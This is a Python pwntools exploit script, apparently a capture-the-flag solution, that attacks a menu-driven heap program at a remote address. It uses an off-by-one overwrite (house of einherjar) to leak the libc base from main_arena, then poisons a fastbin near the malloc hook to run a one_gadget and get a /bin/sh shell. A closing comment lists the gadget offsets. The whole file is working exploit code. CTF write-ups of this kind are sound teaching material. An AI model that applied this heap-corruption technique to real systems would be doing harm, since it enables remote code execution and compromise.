#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'pwn'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "47.105.49.57"
remotePort = 5998

LOCAL = 0
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(size, data):
	sla('<< ', str(1))
	sla(': ', str(size))
	sa(':', data)

def rm(idx):
	sla('<< ', str(4))
	sla(':', str(idx))

def md(idx, data):
	sla('<< ', str(2))
	sla(':', str(idx))
	sa(':', data)

def dp(idx):
	sla('<< ', str(3))
	sla(':', str(idx))

def q():
	sla('<< ', str(1))

#--------------------------Exploit--------------------------
def exploit():
	ad(0x80, 'A' * 0x80) #idx 0
	ad(0x80, 'B' * 0x80) #idx 1
	ad(0x68, 'C' * 0x68) #idx 2
	ad(0x80, 'D' * 0x80) #idx 3
	ad(0x68, 'C' * 0x68) #idx 4 for not emrge to top chunk

	p = 'C' * 0x60
	p += p64(0x190)
	p += '\x90'
	md(2, p)
	rm(2) # for fastbin
	rm(0) # for emrge heap
	rm(3) # house of einharjar

	ad(0x80, 'A' * 0x80) #idx 0
	dp(1)
	main_arena = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - 0x58
	li('main_arena ' + hex(main_arena))
	lib.address = main_arena - 0x3c4b20
	li('libc_base ' + hex(lib.address))
	realloc = lib.sym['realloc']

	gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
	one_gadget = lib.address + gadget[1]
	
	p = 'B' * 0x80
	p += p64(0)
	p += p64(0x71)
	p += p64(main_arena - 0x33)
	ad(0xA0, p)

	p = 'A' * (0x13 - 8)
	p += p64(one_gadget)
	p += p64(realloc + 13)
	ad(0x68, 'A')
	ad(0x68, p)

	#db()
	li('libc_base ' + hex(lib.address))
	sl('1')
	sl('10')
	

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()

'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
[rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
[rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
[rsp+0x70] == NULL
'''
